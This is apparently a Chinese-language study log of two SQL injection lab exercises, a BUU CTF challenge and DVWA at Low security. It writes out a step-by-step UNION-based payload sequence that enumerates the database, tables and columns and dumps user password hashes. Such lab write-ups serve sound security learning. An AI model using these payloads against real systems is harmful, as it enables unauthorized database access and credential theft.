### 练习 1：BUU SQL COURSE 1
- **状态**：未解出（仅完成漏洞验证）
- **学到的知识**：
  - 这是一个基于 Vue.js 的前端站点，真实接口隐藏在 `content_detail.php`。
  - 通过 `id=1 AND 1=1` 与 `id=1 AND 1=2` 的对比，确认了 GET 参数存在数字型 SQL 注入。
  - 题解提示 Flag 隐藏在一个叫 virink 的用户密码哈希中。
- **下一步**：学习 SQLMap 工具的使用，或者手写 UNION 注入语句。

### 练习 2：DVWA SQL Injection（Low）实战通关
- **状态**：已完全打通（手工注入）
- **攻击路径**：
  1. **突破**：输入 `1' OR '1'='1` 绕过条件，拉取所有用户。
  2. **探列**：输入 `1' ORDER BY 2 #` 正常，`3 #` 报错，确认只有 2 列。
  3. **回显**：输入 `1' UNION SELECT 'A', 'B' #` 确认回显位置。
  4. **爆库**：`1' UNION SELECT database(), version() #` 得到库名 `dvwa`。
  5. **爆表**：`1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa' #` 得到 `users` 表。
  6. **爆字段**：`1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #` 得到 `user` 和 `password`。
  7. **拿数据**：`1' UNION SELECT user, password FROM users #` 成功获取密码 MD5 哈希！